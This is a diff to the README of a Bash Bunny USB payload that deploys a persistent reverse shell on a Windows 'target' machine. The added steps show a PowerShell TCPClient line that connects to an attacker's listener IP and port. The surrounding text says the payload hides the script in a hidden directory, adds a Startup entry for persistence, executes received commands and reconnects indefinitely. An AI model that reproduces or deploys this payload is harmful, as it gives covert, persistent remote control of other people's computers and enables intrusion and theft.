@@ -51,15 +51,22 @@ This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows 
    - Replace `4444` with your desired port.
 
 ### **🔹 Deployment via Bash Bunny**
-1. **Copy the payload files** to your Bash Bunny:
+1. **Edit reverse.ps1** to set the correct **listener IP address**:
+- Open reverse.ps1 and locate this line:
+  ```
+  $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
+  ```  
+  - Replace 192.168.1.0 with your listener’s IP address.  
+  - Replace 4444 with your listener’s port, if necessary. 
+2. **Copy the payload files** to your Bash Bunny:
    ```
    /payloads/switch1/
    ├── payload.txt
    ├── setup_reverse_shell.ps1
    ├── reverse.ps1
    ```
-2. **Insert the Bash Bunny into the target Windows machine.**
-3. The payload will:
+3. **Insert the Bash Bunny into the target Windows machine.**
+4. The payload will:
    - Copy the reverse shell script to a hidden directory.
    - Create a **Startup entry** to ensure persistence.
    - Initiate the first connection attempt.
@@ -79,7 +86,6 @@ This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows 
 - Ensures the reverse shell script runs on every system boot.
 
 ### **`reverse.ps1` (Reverse Shell Loop)**
-**Change the IP to the Listener IP**
 - **Attempts to connect** to the attacker's listener IP & port.
 - **Executes received commands** and returns output.
 - **Loops indefinitely**, retrying if disconnected.
